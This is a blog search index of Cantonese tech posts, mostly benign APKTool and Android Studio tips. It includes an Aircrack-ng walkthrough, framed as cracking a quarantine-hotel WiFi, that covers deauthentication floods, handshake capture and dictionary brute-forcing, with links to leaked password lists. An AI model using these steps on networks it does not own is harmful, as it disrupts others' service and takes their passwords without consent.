<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APKTool - Decode APK 檔 | Reverse engineering</title>
    <url>/2022/02/17/APKTool-Reverse-engineering/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://ibotpeaches.github.io/Apktool/">APKTool</a> 係一款用黎將 APK 檔 decode，重新整成新既 APK 既程式。<br>即係可以攞到呢個 APK 既 Source code，再將佢修改 (前提你要識睇 Java,XML)，然後再整成新既 APK。</p>
<h1 id="Download-APKTool"><a href="#Download-APKTool" class="headerlink" title="Download APKTool"></a>Download APKTool</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1"><i class="fa-brands fa-linux"></i> Linux non-Package</button></li><li class="tab"><button type="button" data-href="#test1-2"><i class="fa-brands fa-linux"></i> APT Package</button></li><li class="tab"><button type="button" data-href="#test1-3"><i class="fa-brands fa-windows"></i> Windows</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><blockquote>
<p>呢個方法係唔洗用到 Package Manager，亦都係官方教既下載方法</p>
</blockquote>
<p>首先我地要確保你部機係裝左 java jdk，<br>未裝既可以去 <a href="https://www.oracle.com/java/technologies/downloads/">https://www.oracle.com/java/technologies/downloads/</a><br>Debian 用家可以 download 佢個 <code>.deb</code> 檔<br>然後打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install -f jdk-17_linux-x64_bin.deb </span><br></pre></td></tr></table></figure>

<p>裝完之後再 download <a href="https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool">https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool</a><br>將佢 save 做 <code>apktool</code></p>
<p>再去 <a href="https://bitbucket.org/iBotPeaches/apktool/downloads/">https://bitbucket.org/iBotPeaches/apktool/downloads/</a><br>下載最新既 <code>jar</code> 檔<br>download 完之後個名改返做 <code>apktool.jar</code>，</p>
<p>然後我地需要改改呢兩個檔案既檔案權限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x apktool apktool.jar</span><br></pre></td></tr></table></figure>

<p>再將呢兩個檔案 copy 去 <code>/usr/local/bin</code> 呢個位置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp -r apktool apktool.jar /usr/local/bin</span><br></pre></td></tr></table></figure>

<p>完成次後我地再喺 Terminal 打 <code>apktool</code><br>咁就可以用啦。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><blockquote>
<p>簡單一行裝完。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install apktool -y</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p>一樣我地係需要裝 JDK 先可以行到 APKTool.</p>
<p>裝好 JDK 之後 再下載 <a href="https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat">https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat</a><br>將佢 既名 save 做 <code>apktool.bat</code></p>
<p>再去 <a href="https://bitbucket.org/iBotPeaches/apktool/downloads/">https://bitbucket.org/iBotPeaches/apktool/downloads/</a> 搵最新既 <code>jar</code> 檔，<br>下載完再將佢 改名做 <code>apktool.jar</code></p>
<p>完成之後再將呢兩個檔案 copy 去 <code>C://Windows</code><br>之後你 <code>cmd</code> or <code>powershell</code> 打 <code>apktool</code> 就會有反應㗎啦。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<img src="/2022/02/17/APKTool-Reverse-engineering/apktool.png" class="">

<h2 id="Decompiling-APK"><a href="#Decompiling-APK" class="headerlink" title="Decompiling APK"></a>Decompiling APK</h2><blockquote>
<p>Decompiling APK.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apktool d file.apk</span><br></pre></td></tr></table></figure>

<img src="/2022/02/17/APKTool-Reverse-engineering/apktool-d.gif" class="">

<h2 id="Recompile-APK"><a href="#Recompile-APK" class="headerlink" title="Recompile APK"></a>Recompile APK</h2><blockquote>
<p>Build the Source Code</p>
</blockquote>
<p>預設 Recompile 完既 APK 檔會係擺喺 folder dist 入面。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apktool b folder_name</span><br></pre></td></tr></table></figure>

<img src="/2022/02/17/APKTool-Reverse-engineering/apktool-b.gif" class="">

<p>reference<br><a href="https://github.com/iBotPeaches/Apktool">https://github.com/iBotPeaches/Apktool</a><br><a href="https://ibotpeaches.github.io/Apktool/build/">https://ibotpeaches.github.io/Apktool/build/</a><br><a href="https://stackoverflow.com/questions/66354829/how-to-correctly-re-compile-an-apk-file">https://stackoverflow.com/questions/66354829/how-to-correctly-re-compile-an-apk-file</a></p>
]]></content>
      <categories>
        <category>Reverse engineering</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Crack</tag>
      </tags>
  </entry>
  <entry>
    <title>Aircrack-NG - 爆鳩隔離屋 wifi 密碼 XD</title>
    <url>/2021/12/11/Aircrack-NG-commands/</url>
    <content><![CDATA[<img src ="aircrack-ng-logo.svg" width="200px"/>

<h1 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng "></a>Aircrack-ng <i class="fas fa-wifi"></i></h1><p><a href="https://www.kali.org/tools/aircrack-ng/">Aircrack-ng</a> 是一套完整的評估 WiFi 網絡安全的工具。</p>
<p>它專注於 WiFi 安全的不同領域：</p>
<ul>
<li>監控：數據包捕獲和數據導出到文本文件以供第三方工具進一步處理。</li>
<li>攻擊：通過數據包注入重放攻擊、解除身份驗證、虛假接入點等。</li>
<li>測試：檢查 WiFi 卡和驅動程序功能（捕獲和注入）。</li>
<li>破解：WEP 和 WPA PSK（WPA 1 和 2）。</li>
</ul>
<p>所有工具都是命令行，允許編寫大量腳本，許多 GUI 都利用了此功能。<br>主要適用於 Linux，也適用於 Windows、macOS、FreeBSD、OpenBSD、NetBSD，以及 Solaris 甚至 eComStation 2。</p>
<p>【操作方法】：使用終端機全指令操作<br>【作者 Github】：<a href="https://github.com/aircrack-ng/aircrack-ng">https://github.com/aircrack-ng/aircrack-ng</a><br>【文章使用系統】：Kali Linux</p>
<h1 id="需要硬件"><a href="#需要硬件" class="headerlink" title="需要硬件"></a>需要硬件</h1><p>如果你要用 Aircrack-NG 既任何一款工具，你必須要有 Wireless Card / Wireless USB。</p>
<div class="note warning flat">
    如果你本身部機用 Lan 線黎上網，無任何 Wireless Card 既話，咁以下既爆破行為你都唔會做到，建議買隻 USB。
</div>

<div class="note info flat">
    你有 Wireless Card 既話，喺 Ethical hacking 層面黎講係好多野都可以做到。相反，冇既話好多野都會限制左你。
</div>

<h1 id="檢查網卡狀態"><a href="#檢查網卡狀態" class="headerlink" title="檢查網卡狀態"></a>檢查網卡狀態</h1><p>如果顯示唔到好似下圖咁既文字，咁就代表失敗，失敗就代表做唔到以下既操作 :(</p>
<div class="note info flat">
    說明：通常都係會 display wlan0，唔係既係下一步轉一守個名就得。
</div>

<ul>
<li>ESSID : WIFI 名稱，但由於我未入，所以顯示 <code>off/any</code>。</li>
<li>Access Point : 你去既 Wifi 既 MAC Address，但由於我未入 wifi，所以會顯示 <code>Not-Associated</code>。</li>
<li>Mode : 我地而加張卡係處於一個咩狀態 (未開係會顯示 Managed)。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# iwconfig</span><br></pre></td></tr></table></figure>
<img src="/2021/12/11/Aircrack-NG-commands/iwconfig.gif" class="">

<span id="more"></span>

<h1 id="啟動-Monitor-mode"><a href="#啟動-Monitor-mode" class="headerlink" title="啟動 Monitor mode"></a>啟動 Monitor mode</h1><p>呢度係咪 <code>wlan0</code> 取決於你打完 <code>iwconfig</code> 出現左既係咩名，有機會唔係 <code>wlan0</code>，咁唔係既話只需要打返佢顯示既名就得。</p>
<div class="note warning flat">
    注意：打完呢句就會入左 <code>Monitor Mode</code>，喺呢個 Mode 底下，會將你 而加張 Wireless 卡 Disconnect。
</div>

<div class="note info flat">
    提示：如果你係用 notebook 進行操作既話，喺冇 lan 線既狀態你係會上唔到網。相反，如果你係用 desktop 進行操作既話，咁你就可以繼續用 lan 線黎上網。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# airmon-ng start wlan0</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/Aircrack-NG-commands/airmon-ng%20start%20wlan0.png" class="">

<h1 id="尋找爆破目標"><a href="#尋找爆破目標" class="headerlink" title="尋找爆破目標"></a>尋找爆破目標</h1><p>喺下面，我地可以見到你而加呢個 Area Detect 到既 Wifi 有乜，<br>而加我地需要搵你想要既目標，然後我機要拎呢部機既三樣野：</p>
<ul>
<li>ESSID = WIFI名</li>
<li>BSSID = WIFI Mac Address</li>
<li>CH = 頻度編號</li>
</ul>
<div class="note info flat">
    提示：搵到既時候，你可以選擇繼續 Search 定係 <code>Ctrl+C</code> 停止 Searching。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# airodump-ng wlan0mon </span><br></pre></td></tr></table></figure>
<img src="/2021/12/11/Aircrack-NG-commands/airodump-ng%20wlan0mon.gif" class="">


<h1 id="建立-Cap-檔案"><a href="#建立-Cap-檔案" class="headerlink" title="建立 Cap 檔案"></a>建立 Cap 檔案</h1><p>而加我地需要建立一個 Cap file，我地要打返佢 <code>顯示既既兩樣野</code> 同埋 <code>你想要既 cap file 名稱</code>：</p>
<ul>
<li>-d [BSSID]：呢個 Wifi 既 BSSID 係乜呢？</li>
<li>-c[number]：呢個 Wifi 既 Channal 數字係乜呢？</li>
<li>-w [Cap filename]：你想將呢個 cap file 改做乜野名呢？</li>
</ul>
<div class="note info flat">
    說明：輸入完成後會進入截取 handshake 程序。
</div>

<p>以下格式示範：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airodump-ng -d [BSSID] -c[CH] -w [Cap file Name] wlan0mon</span><br></pre></td></tr></table></figure>

<p>完整示範：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airodump-ng -d 12:34:56:78:19:65 -c3 -w 2.4G wlan0mon</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/Aircrack-NG-commands/-D.gif" class="">

<img src="/2021/12/11/Aircrack-NG-commands/-D2.gif" class="">

<h2 id="生成檢查"><a href="#生成檢查" class="headerlink" title="生成檢查"></a>生成檢查</h2><p>當你輸入完以上既指令生成 cap 檔案後，你會發現你既當時入面多左五個檔案，包括係：</p>
<ul>
<li>-01.cap</li>
<li>-01.csv</li>
<li>-01.kismet.csv</li>
<li>-01.kismet.net.xml</li>
<li>-01.log.csv</li>
</ul>
<p>咁就代表成功。</p>
<img src="/2021/12/11/Aircrack-NG-commands/check%20ha.gif" class="">

<h1 id="功擊裝置"><a href="#功擊裝置" class="headerlink" title="功擊裝置"></a>功擊裝置</h1><p>黎到呢一步，我地要攞到呢個 wifi 既 <code>Handshake</code> 或者 <code>PMKID</code>，咁先可以進行爆破同埋斷鳩佢線既程序。</p>
<p>攞既方法只需要將部機進行斷線，然後等佢重新連 wifi，然後就會出現。<br>而點樣斷鳩佢線？.. 睇埋落去你就會知道點做 A_A</p>
<div class="note warning flat">
    警告：截取既時候唔好將個 windows 閂撚左佢，唔係既話你又要打過係好撚麻煩 =.=
</div>

<h2 id="成個-Device-功擊"><a href="#成個-Device-功擊" class="headerlink" title="成個 Device 功擊"></a>成個 Device 功擊</h2><p>以下呢個指令會將入面所有機都會踢佢走，踢佢走即係代表冇人會再入到呢個 wifi 上網，而當佢嘗試重新連 wifi 既時候，你就已經成功拎到 handshake :3</p>
<div class="post-outdate-notice">
    警告：如果高調進行功擊，wifi 有異常會造成不必要的影響，請小心喔 ~
</div>

<h3 id="格式示範"><a href="#格式示範" class="headerlink" title="格式示範"></a>格式示範</h3><ul>
<li>–deauth 0：代表無限功擊。</li>
</ul>
<div class="note info flat">
    說明：呢個方法係會喺你停之前都唔會停止功擊，直到你閂 windows 或者鍵盤撳 <code>ctrl + c</code>。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aireplay-ng --deauth 0 -a [BSSID] wlan0mon</span><br></pre></td></tr></table></figure>

<h3 id="功擊示範"><a href="#功擊示範" class="headerlink" title="功擊示範"></a>功擊示範</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aireplay-ng --deauth 0 -a 12:34:56:78:19:65 wlan0mon</span><br></pre></td></tr></table></figure>

<h2 id="單一指定-Device-功擊"><a href="#單一指定-Device-功擊" class="headerlink" title="單一指定 Device 功擊"></a>單一指定 Device 功擊</h2><p>唔好意思，因為我寫個陣寫漏左呢個位，冇整到圖出黎，加埋淨係用左一部機做 test =.=</p>
<div class="note info flat">
    說明：如果想指定功擊某裝置低調爆破密碼既話，使用 -c 指定裝置。
</div>

<ul>
<li>–deauth 0 ：如果將 0 改做 30，咁就係功擊 30 下。</li>
</ul>
<h3 id="格式示範-1"><a href="#格式示範-1" class="headerlink" title="格式示範"></a>格式示範</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aireplay-ng --deauth 30 -a [BSSID] -c [ESSID] wlan0mon</span><br></pre></td></tr></table></figure>

<h3 id="功擊示範-1"><a href="#功擊示範-1" class="headerlink" title="功擊示範"></a>功擊示範</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aireplay-ng --deauth 30 -a 12:34:56:78:19:65 -c 12:34:56:78:19:65 wlan0mon</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/Aircrack-NG-commands/handsh.gif" class="">


<h1 id="對方重新連接-wifi"><a href="#對方重新連接-wifi" class="headerlink" title="對方重新連接 wifi"></a>對方重新連接 wifi</h1><p>當對方嘗試重新連接 wifi 既時候就會喺右上角出現左 <code>handshake</code> or <code>PMKID</code>。</p>
<p>接下來就可以進行爆破密碼了。</p>
<div class="note info flat">
    選擇性：功擊已經可以停止，因為已經拎到 handshake，你可以選擇放生佢部機定係繼續打鳩佢。
</div>

<img src="/2021/12/11/Aircrack-NG-commands/aireplay-0.gif" class="">

<h1 id="進行爆破密碼"><a href="#進行爆破密碼" class="headerlink" title="進行爆破密碼"></a>進行爆破密碼</h1><p>當我地攞到 <code>Handshake</code> or <code>PMKID</code> 就可以 Brute Force Wifi password。</p>
<p>另外，進行密碼爆破你會需要使用字典庫然後將每個密碼以電腦運算的速度每個嘗試。</p>
<div class="note info flat">
    點擊以下藍色字的連結直接下載檔案。
</div>


<p>【字典庫來源】：<a href="https://www.hackers-arise.com/passwords">hackers-arise</a>, <a href="https://github.com/brannondorsey/naive-hashcat/releases/">brannondorsey</a></p>
<table>
<thead>
<tr>
<th>字典庫</th>
<th>分別</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou.txt</a></td>
<td>Github find</td>
</tr>
<tr>
<td><a href="https://ca510519-d746-4f7e-aeca-381f28c15a70.filesusr.com/ugd/6a4a49_54234d4037a244c8be996526c498b07f.xlsx?dn=top_10000_passwords.xlsx">Top 10000 Password.xlsx</a></td>
<td>….</td>
</tr>
<tr>
<td><a href="https://ca510519-d746-4f7e-aeca-381f28c15a70.filesusr.com/ugd/6a4a49_f1dd26191a6a404e8cab48be017cd3ed.xlsx?dn=half%20million%20comcast%20passwords.xlsx">half million comcast passwords.xlsx</a></td>
<td>These 10,000 passwords represent about 10% of all passwords found in data dumps</td>
</tr>
<tr>
<td><a href="https://ca510519-d746-4f7e-aeca-381f28c15a70.filesusr.com/ugd/6a4a49_eeb9bba3dee74962896be827e2fd2da9.txt?dn=Top_1m_Passwords.txt">Top_1m_Passwords.txt</a></td>
<td>These Top 1 million passwords represent approximately 37% of all passwords found in data dumps on the dark web.</td>
</tr>
</tbody></table>
<h2 id="格式示範-2"><a href="#格式示範-2" class="headerlink" title="格式示範"></a>格式示範</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aircrack-ng [Cap file name] -w [password list file]</span><br></pre></td></tr></table></figure>

<h2 id="功擊示範-2"><a href="#功擊示範-2" class="headerlink" title="功擊示範"></a>功擊示範</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aircrack-ng 2.4G-01.cap -w rockyou.txt</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/Aircrack-NG-commands/cracking.png" class="">

<h1 id="關閉-Monitor-Mode"><a href="#關閉-Monitor-Mode" class="headerlink" title="關閉 Monitor Mode"></a>關閉 Monitor Mode</h1><p>爆破後，想恢復網路的話請輸入以下指令關閉 Monitor Mode。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/Aircrack-NG-commands/stop.png" class="">



<h1 id="文章使用指令"><a href="#文章使用指令" class="headerlink" title="文章使用指令"></a>文章使用指令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br><span class="line"></span><br><span class="line">airodump-ng wlan0mon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS PS PS PS PS, YOU NEED TO GET HANDshake,AFTER YOU CAN DO ATTACK OR BRUTEFORCE PASSWORD.</span><br><span class="line">airodump-ng -d [BSSID] -c[CH] -w [ESSID Cap Name] wlan0mon</span><br><span class="line"></span><br><span class="line">Attack :</span><br><span class="line">aireplay-ng --deauth 0 -a [BSSID] wlan0mon</span><br><span class="line"></span><br><span class="line">only attack one :</span><br><span class="line">aireplay-ng --deauth 0 -a [BSSID] -c [ESSID] wlan0mon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BruteForce Password :</span><br><span class="line">aircrack-ng [Cap file name] -w [password list file]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Ethical hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio - Failed to apply plugin &#39;com.android.internal.application&#39;</title>
    <url>/2022/02/22/Android-Studio-Caused-by-org-gradle-api-internal-plugins-PluginApplicationException-Failed-to-apply-plugin-com-android-internal-application/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當你改 folder 名既時候，再入發現佢出現 Error</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Caused by : org.gradle.api.internal.plugins.PluginApplicationException: Failed to apply plugin &#x27;com.android.internal.application&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h1><p>只需要喺 file <code>gradle.properties</code> 入面加一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android.overridePathCheck=true</span><br></pre></td></tr></table></figure>

<p>然後重開將你而加開緊個個 Project Close，<br>再將 Android Studio 重開，<br>再 Open 多次你既 Project。</p>
<p>完成 ~</p>
<hr>
<p>參考資料<br><a href="https://stackoverflow.com/questions/37086806/android-studio-failed-to-apply-plugin-id-com-android-application">https://stackoverflow.com/questions/37086806/android-studio-failed-to-apply-plugin-id-com-android-application</a></p>
]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Apps</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio - 改程式 title</title>
    <url>/2022/01/22/Android-Studio-Change-Apps-title/</url>
    <content><![CDATA[<h1 id="改-Title-名"><a href="#改-Title-名" class="headerlink" title="改 Title 名"></a>改 Title 名</h1><p>開左你既 Project 之後，</p>
<p>搵 <code>res/values/strings.xml</code></p>
<p>入面包住既名 = APP title</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;app_name&quot;</span>&gt;</span>我個程式既名係呢個位改<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Done.</p>
]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Apps</tag>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio - EditText 只允許輸入數字</title>
    <url>/2022/01/26/Android-Studio-EditText-only-allow-enter-number/</url>
    <content><![CDATA[<h1 id="只允許輸入數字"><a href="#只允許輸入數字" class="headerlink" title="只允許輸入數字"></a>只允許輸入數字</h1><p>去 <code>activity_main.xml</code> 入面既 <code>code</code> 將你要改既 <code>EditText</code></p>
<p>入面加 / 改 <code>android:inputType=&quot;number&quot;</code></p>
<p>Full code </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:inputType</span>=<span class="string">&quot;number&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>之後你再 run 一次 Apps 再撳個 EditText 就會得出以下效果。</p>
<img src="/2022/01/26/Android-Studio-EditText-only-allow-enter-number/done.png" class="">

<p>完成。</p>
]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Apps</tag>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio - 插件上安裝另外的 Themes</title>
    <url>/2022/01/12/Android-Studio-Install-plugin-themes/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>覺唔覺 Android Studio 原本既 Themes 睇落真係好唔順眼？<br>如果你同我一樣係咁諗，咁你就一定要學識點樣裝一個新 Theme 喺 Android Studio 入面啦！</p>
<p>我地入到去 Project 再撳 <code>File</code> &gt; <code>Settings...</code> &gt; <code>Plugins</code> 再查 <code>Theme</code></p>
<p>選擇你想要既 Theme 再安裝就成功！</p>
<img src="/2022/01/12/Android-Studio-Install-plugin-themes/1.png" class="">


<p>參考資料 :<br><a href="https://www.geeksforgeeks.org/different-ways-to-change-or-add-themes-to-android-studio/">https://www.geeksforgeeks.org/different-ways-to-change-or-add-themes-to-android-studio/</a></p>
]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Apps</tag>
        <tag>安裝</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio - 檔案路徑位置</title>
    <url>/2022/02/02/Android-Studio-Paths/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下係路徑位置</p>
<h2 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\app\src\main\AndroidManifest.xml</span><br></pre></td></tr></table></figure>

<h2 id="MainActivity-java"><a href="#MainActivity-java" class="headerlink" title="MainActivity.java"></a>MainActivity.java</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\app\src\main\java\com\example\Apps_name\MainActivity.java</span><br></pre></td></tr></table></figure>

<h2 id="activity-main-xml"><a href="#activity-main-xml" class="headerlink" title="activity_main.xml"></a>activity_main.xml</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">activity_main.xml</span><br></pre></td></tr></table></figure>

<h2 id="strings-xml"><a href="#strings-xml" class="headerlink" title="strings.xml"></a>strings.xml</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\app\src\main\res\values\strings.xml</span><br></pre></td></tr></table></figure>

<h2 id="themes-xml"><a href="#themes-xml" class="headerlink" title="themes.xml"></a>themes.xml</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\app\src\main\res\values\themes.xml</span><br></pre></td></tr></table></figure>

<h2 id="colors-xml"><a href="#colors-xml" class="headerlink" title="colors.xml"></a>colors.xml</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\app\src\main\res\values\colors.xml</span><br></pre></td></tr></table></figure>

<h2 id="app-debug-apk"><a href="#app-debug-apk" class="headerlink" title="app-debug.apk"></a>app-debug.apk</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\app\build\outputs\apk\debug\app-debug.apk</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Apps</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio - Preview 顯示 System UI</title>
    <url>/2022/01/26/Android-Studio-Show-System-UI/</url>
    <content><![CDATA[<h1 id="進入"><a href="#進入" class="headerlink" title="進入"></a>進入</h1><p>去返你 <code>UI</code> 個位，搵個眼既公仔圖示，<br>撳一下再撳 <code>Show System UI</code>.</p>
<h1 id="示範"><a href="#示範" class="headerlink" title="示範"></a>示範</h1><img src="/2022/01/26/Android-Studio-Show-System-UI/ui.gif" class="">

<center><h1 style="font-size:10rem">搞撚掂。</h1></center>]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Apps</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio - VCS root configuration problems</title>
    <url>/2022/02/22/Android-Studio-VCS-root-configuration-problems/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當你 download 人地既 Project 既時候，<br>出現 Error</p>
<img src="/2022/02/22/Android-Studio-VCS-root-configuration-problems/1.png" class="">

<h1 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h1><p>首先 Close Project，<br>再將你 Project 入面 既 <code>.idea</code> folder 成個 delete.<br>開 Open 多次 Proejct 就得。</p>
<hr>
<p>參考資料<br><a href="https://stackoverflow.com/questions/46311661/invalid-vcs-root-mapping-3-errors-on-my-project">https://stackoverflow.com/questions/46311661/invalid-vcs-root-mapping-3-errors-on-my-project</a></p>
]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Apps</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio - 安裝虛擬主機</title>
    <url>/2022/01/12/Android-Studio-install-AVD-Virtual-Devices/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要喺 Android Studio 進行測試程式 (debug)</p>
<p>我地要有一部虛擬主機黎幫你做test</p>
<p>上一個Post 只係教左你點樣安裝 Android Studio</p>
<p>冇教到你點樣安裝虛擬主機，而虛擬主機係要另外裝既</p>
<p>所以今個Post係教你點樣裝虛擬主機既！</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>首先，我地開個 Project，之後去 <code>Tools</code> &gt; <code>AVD Manager</code></p>
<img src="/2022/01/12/Android-Studio-install-AVD-Virtual-Devices/1.png" class="">

<p>之後喺右下角撳 <code>+ Create Virtual Device...</code></p>
<img src="/2022/01/12/Android-Studio-install-AVD-Virtual-Devices/2.png" class="">

<p>選擇你要寫既Device(呢度我會示範 手機，所以我會撳Phone)<br>再選擇一個手機型號，再撳 <code>Next</code></p>
<img src="/2022/01/12/Android-Studio-install-AVD-Virtual-Devices/3.png" class="">

<p>之後我地係需要 Download，Download返再撳 Next</p>
<img src="/2022/01/12/Android-Studio-install-AVD-Virtual-Devices/4.png" class="">

<p>之後你鐘意可以改名或者就咁撳 Finish</p>
<img src="/2022/01/12/Android-Studio-install-AVD-Virtual-Devices/5.png" class="">

<p>咁你再喺你既 Project 撳 <code>Shift + f10</code> Run 個 Apps 就成功啦。</p>
<img src="/2022/01/12/Android-Studio-install-AVD-Virtual-Devices/6.png" class="">]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Apps</tag>
        <tag>安裝</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio - 安裝 (Windows 10)</title>
    <url>/2022/01/11/Android-Studio-install/</url>
    <content><![CDATA[<img src="logo.png" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Android Studio是一個為Android平台開發程式的整合式開發環境。2013年5月16日在Google I/O上發布，可供開發者免費使用。</p>
<p>2013年5月發布早期預覽版本，版本號為0.1。2014年6月發布0.8版本，至此進入beta階段。第一個穩定版本1.0於2014年12月8日發布。</p>
<p>Android Studio基於JetBrains IntelliJ IDEA，為Android開發特殊客製化，並在Windows、OS X和Linux平台上均可執行。</p>
<h1 id="官網"><a href="#官網" class="headerlink" title="官網"></a>官網</h1><ul>
<li><a href="https://developer.android.com/studio">Android Stdio</a></li>
</ul>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><ul>
<li><a href="https://developer.android.com/studio">https://developer.android.com/studio</a></li>
</ul>
<img src="/2022/01/11/Android-Studio-install/official1.png" class="">


<p>搵到最底之後</p>
<img src="/2022/01/11/Android-Studio-install/official2.png" class="">

<p>或者撳呢條link download<br><a href="https://r2---sn-un57sn7z.gvt1.com/edgedl/android/studio/install/2020.3.1.26/android-studio-2020.3.1.26-windows.exe">https://r2---sn-un57sn7z.gvt1.com/edgedl/android/studio/install/2020.3.1.26/android-studio-2020.3.1.26-windows.exe</a></p>
